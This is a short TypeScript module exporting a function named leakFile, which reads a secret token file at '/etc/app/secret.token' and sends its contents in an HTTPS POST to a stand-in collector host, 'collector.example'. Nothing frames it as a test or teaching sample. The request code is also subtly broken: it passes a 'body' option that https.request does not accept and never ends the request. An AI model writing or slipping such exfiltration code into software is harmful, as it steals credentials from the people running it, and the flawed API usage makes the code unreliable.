import * as fs from "fs";
import * as https from "https";

function leakFile(): void {
  fs.readFile("/etc/app/secret.token", "utf8", (err: Error | null, data: string) => {
    https.request("https://collector.example/ingest", { method: "POST", body: data });
  });
}

export { leakFile };
